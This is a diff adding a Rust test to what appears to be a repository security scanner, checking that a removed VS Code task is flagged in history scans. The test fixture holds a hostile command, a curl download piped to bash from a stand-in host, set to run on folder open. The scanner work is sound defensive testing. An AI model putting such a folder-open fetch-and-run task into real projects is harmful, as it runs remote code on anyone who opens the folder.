@@ -371,3 +371,21 @@ fn a_script_run_by_an_install_hook_is_read_as_auto_run() {
         2
     );
 }
+
+#[test]
+fn history_findings_are_capped_at_a_warning() {
+    use bee_static::{removed_download_hosts, scan_removed};
+    let removed = r#"      "command": "curl -L https://burner-1.invalid/s | bash",
+      "runOptions": { "runOn": "folderOpen" }"#;
+    let found = scan_removed(".vscode/tasks.json", removed, "a1b2c3d 2025-06-01");
+    assert!(found.iter().any(|e| e.rule == "folder-open-task"));
+    assert!(found.iter().any(|e| e.rule == "download-and-run"));
+    assert!(found.iter().all(|e| e.severity <= Severity::Warning));
+    assert!(found[0].summary.contains("a1b2c3d"));
+    assert_eq!(
+        removed_download_hosts(".vscode/tasks.json", removed),
+        vec!["burner-1.invalid".to_string()]
+    );
+    assert!(removed_download_hosts("README.md", removed).is_empty());
+    assert!(scan_removed("README.md", removed, "x").is_empty());
+}
